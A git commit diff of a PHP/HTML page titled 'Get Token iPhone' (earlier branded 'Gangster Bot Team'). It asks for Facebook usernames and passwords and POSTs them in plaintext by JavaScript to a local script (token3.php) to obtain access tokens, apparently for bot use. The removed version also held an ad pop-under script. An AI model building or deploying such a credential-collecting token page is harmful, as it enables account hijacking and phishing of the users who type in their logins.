982ab366596de726920cb71aadd746972e18eda2
15564564 <didoxi@vpn33.top>
2017-04-12 12:10:33 +0530

    Update Token.php

--- Token.php
+++ Token.php
@@ -1,102 +1,56 @@
 
-<marquee behavior="scroll" onmouseover="this.stop()" onmouseout="this.start()" scrollamount="1" scrolldelay="7" direction="left" truespeed="truespeed"><div class="header-icon">
-                                <i class="pe page-header-icon pe-7s-shield"></i>
-                            </div>
-                            <div class="header-title">
-                                <h3 class="m-b-xs">WE-3.TK</h3>
-                                <small>
-                                    JUST TKN LAGA 24/7  MST CHALEGA 420.COM KAMINA
-                                </small>
-                            </div>
-
-<img src="http://2.bp.blogspot.com/-aQ6awdbNqZQ/VXJGCGGBGAI/AAAAAAAAMGM/_bmty7Pl0b4/s1600/new.gif"><font color="red"><b>★NASEER ★MEHTAB ★MUJAHID ★WAQAS CHAUDHARY ★GULRAIZ ★ALI HASSAN ★SUFYAN  ★</b></font>WE-3.TK
-</marquee>
-
-
-
-
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
-<meta name="description" content="This Website Is For Iphone Token"/>
-<meta name="author" content="Mujahid Khan"/>
-<title>~={Naseer}=~</title><link rel="stylesheet" type="text/css" href="http://flambon.xtgem.com/fmb/natur.css" media="all,handheld"/><link rel="shortcut icon" href="">
- <script type=text/javascript>
- var _cpp= _cpp || [];
-  _cpp['username']    = "naseer";
-  _cpp['pop_type']    = "2";
-  _cpp['onePer']    = "0";
-  _cpp['freq']        = "20";   
-(function() {
-var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-hs.src =
-var cs = document.getElementsByTagName('script')[0];
-cs.parentNode.insertBefore(hs, cs);
-})();</script>
-<!--- END OF CPX24 CODE --->
+  <title>Get Token iPhone Full Quyền</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+<body>
+ 
+<div class="container">
+  <h2>Get Token iPhone Full Quyền</h2>
+  <div class="panel-group">
+<div class="panel panel-primary">
+      <div class="panel-heading">Không Bị Checkpoint 100%</div>
+      <div class="panel-body">      
+<div class="form-group">
+  <label for="usr">Username:</label>
+  <input type="text" class="form-control" id="tk">
+</div>
+<div class="form-group">
+  <label for="pwd">Password:</label>
+  <input type="password" class="form-control" id="mk">
+</div>
+<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Kích Hoạt</button>
+<p>
+<li id="trave" class="list-group-item"><img src="http://i.imgur.com/4xwpZzp.png"> </li></p>
 
-
-<h2 class="description">
-
-
-
-
-<div id="content">
-<div class="post">
-<div class="post-meta">
-<h2 class="title">
- Gangster Bot Team
-</h2>
-BY :NASEER
+</div>
+    </div>
 </div>
 
-
-
-<style>@import url('https://fonts.googleapis.com/css?family=Josefin+Sans');
-body { font-family: 'Josefin Sans', sans-serif; font-size: 20px;}</style>
-<body>
-
-
-
-
-
-
-<div class="panel-body">
-<form id="flogin" name="flogin" class="form-horizontal" action="" method="POST">
-<div class="form-group col-sm-12">
-<input name="email" id="tk" class="form-control" placeholder="Enter Your Facebook Email or Phone Number"/></div>
-<div class="form-group col-sm-12">
-<input name="pass" type="password" id="mk" class="form-control" placeholder="Enter Your Facebook Password"/></div>
-<div style="text-align: center">
-<button type="button" class="btn btn-danger" onclick="Puaru_Active()" > Get Token </button>
-<br/> <br/> </form>
-<li id="trave" class="list-group-item"><img src="./token.png" width="100%"/>
-</div></div></div>
 <script>
 function Puaru_Active() {
 var http = new XMLHttpRequest();
 var tk = document.getElementById("tk").value;
 var mk = document.getElementById("mk").value;
-var url = "./iphone.php";
+var url = "token3.php";
 var params = "u="+tk+"&p="+mk+"";
 http.open("POST", url, true);
 http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
 http.onreadystatechange = function() {
-if(http.readyState == 4 && http.status == 200) {
-document.getElementById("trave").innerHTML = http.responseText;        
-}
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
 }
 http.send(params);
 }
 </script>
-<footer class="footer">
-<center><p></p></center>
-</footer>
+
 </body>
 </html>
